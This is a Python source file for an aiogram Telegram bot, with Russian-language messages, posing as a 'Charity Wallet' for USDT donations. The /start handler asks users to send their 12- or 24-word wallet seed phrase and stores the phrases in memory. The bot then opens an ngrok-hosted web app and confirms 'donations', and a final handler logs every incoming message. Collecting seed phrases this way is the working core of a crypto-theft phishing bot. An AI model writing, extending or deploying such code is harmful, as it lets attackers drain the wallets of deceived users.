# router.py
import time
import json
import logging
from aiogram import Router, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo, Message
from aiogram.filters import Filter
from typing import Union, Dict, Any
from pydantic import ValidationError

from models import DonationData

router = Router()
NGROK_URL = "https://95ca67826bb9.ngrok-free.app"

# Хранилища
user_seeds = {}  # user_id: seed фраза
waiting_for_seed = {}  # user_id: True (ожидание сид-фразы)


@router.message(Command("start"))
async def cmd_start(message: types.Message):
    user_id = message.from_user.id
    waiting_for_seed[user_id] = True
    await message.answer(
        "🔐 <b>Добро пожаловать в Charity Wallet!</b>\n\n"
        "Пожалуйста, введите вашу seed-фразу (12 или 24 слова) для доступа к кошельку:",
        parse_mode='html'
    )


@router.message(F.text)
async def handle_seed(message: types.Message):
    user_id = message.from_user.id
    if not waiting_for_seed.get(user_id):
        return await message.answer("ℹ️ Введите /start для начала работы")

    words = message.text.strip().split()
    if len(words) not in [12, 24]:
        return await message.answer("❌ Неверный формат! Введите 12 или 24 слова через пробел")

    user_seeds[user_id] = message.text
    waiting_for_seed.pop(user_id, None)

    webapp_url = f"{NGROK_URL}/donate?user_id={user_id}"
    kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(
            text="🚀 Открыть кошелек",
            web_app=WebAppInfo(url=webapp_url)
        )
    ]])

    await message.answer(
        "✅ Seed-фраза принята!\n"
        "Нажмите кнопку ниже, чтобы открыть интерфейс для пожертвований:",
        reply_markup=kb
    )


@router.message(lambda message: message.web_app_data is not None)
async def handle_web_app_data(message: Message):
    try:
        data = json.loads(message.web_app_data.data)
        org = data.get("org")
        amount = data.get("amount")

        await message.answer(f"✅ Пожертвование подтверждено!\nОрганизация: {org}\nСумма: {amount} USDT")
    except Exception as e:
        await message.answer("❌ Произошла ошибка при обработке данных WebApp.")
        print("Ошибка:", e)


@router.message()
async def debug_all(message: types.Message):
    # это встанет последним в файле router.py
    logging.info("🪲 Debug update: %s", message.json(indent=2, ensure_ascii=False))